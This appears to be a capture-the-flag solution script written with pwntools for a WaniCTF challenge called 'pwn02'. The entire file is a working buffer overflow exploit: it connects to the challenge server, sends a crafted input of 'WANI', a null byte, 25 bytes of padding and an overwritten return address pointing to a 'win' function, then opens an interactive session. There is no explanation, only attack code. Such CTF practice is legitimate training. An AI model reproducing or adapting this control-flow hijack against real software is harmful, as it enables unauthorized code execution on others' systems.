from pwn import *

#p = process(["./pwn02"])
p = remote("var.wanictf.org", 9002)
#print(p.recvline())
#p.send("A"*256+"WANI")
#print(p.recvline())

main = int("0x000000000040089d", 16)
win_offset = 0x109
win = 0x40096b

#raw_input("attach gdb")
padding = "A"*25
#print(type(padding), type(win))
#print(type(p64(win)))
print("sending: {}".format("WANI\x00"+padding+p64(win)))
p.sendline("WANI\x00"+padding+p64(win))

p.interactive()
p.close()
